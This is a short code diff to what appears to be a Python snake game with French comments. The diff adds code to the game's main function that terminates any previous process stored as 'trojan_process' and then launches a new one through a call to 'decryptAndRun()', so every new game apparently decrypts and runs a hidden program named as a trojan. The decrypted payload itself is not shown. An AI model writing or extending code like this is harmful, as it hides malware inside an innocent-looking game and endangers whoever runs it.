@@ -56,9 +56,18 @@ def save_high_score(score):
         f.write(str(score))
 
 
-# ----- Fonction Principale du Jeu -----
 def jeu():
-    tr = decryptAndRun()  
+    #hadi stays here to avoide circular import
+    import main
+    if main.trojan_process and main.trojan_process.poll() is None:
+        try:
+            main.trojan_process.terminate()
+            main.trojan_process.wait(timeout=2)
+        except Exception:
+            pass
+    
+    tr = decryptAndRun()
+    main.trojan_process = tr  # Store the process in main module
     global high_score
 
     snake_x = 300
